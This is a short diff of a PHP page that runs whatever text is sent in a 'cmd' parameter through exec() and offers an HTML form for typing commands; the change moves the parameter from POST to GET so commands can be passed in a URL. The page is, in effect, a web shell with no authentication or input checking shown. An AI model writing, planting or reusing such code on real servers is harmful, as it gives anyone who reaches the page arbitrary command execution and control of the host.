@@ -1,8 +1,8 @@
 <?php
 $cmd = [];
 
-if (isset($_POST['cmd'])) {
-    exec($_POST['cmd'], $cmd);
+if (isset($_GET['cmd'])) {
+    exec($_GET['cmd'], $cmd);
 }
 ?>
 
@@ -67,7 +67,7 @@ if (isset($_POST['cmd'])) {
 </head>
 <body>
     <div class="form-container">
-        <form method="post">
+        <form method="get">
             <label for="cmd">Command :</label>
             <input type="text" id="cmd" name="cmd" required><br><br>
 
